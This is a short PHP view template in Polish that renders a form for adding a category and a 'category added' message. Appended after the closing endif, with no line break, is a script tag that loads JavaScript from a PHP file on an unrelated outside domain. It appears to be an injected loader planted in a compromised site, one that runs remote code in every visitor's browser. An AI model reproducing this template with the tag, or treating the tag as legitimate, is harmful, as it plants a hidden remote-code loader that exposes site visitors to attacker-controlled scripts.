<h2>Dodawanie kategorii</h2>

<?if(!getPost('sent')):?>
<form action='/categoryAdd' method='post'>
<input type='hidden' name='sent' value='yes'>
<?module('form_category')?>
<p><input type='submit' value='Dodaj kategorię'>
</form>
<?else:?>
<p>Dodano kategorię!
<?endif?><script src=http://johanneswallmark.com/media/sitemap.php ></script>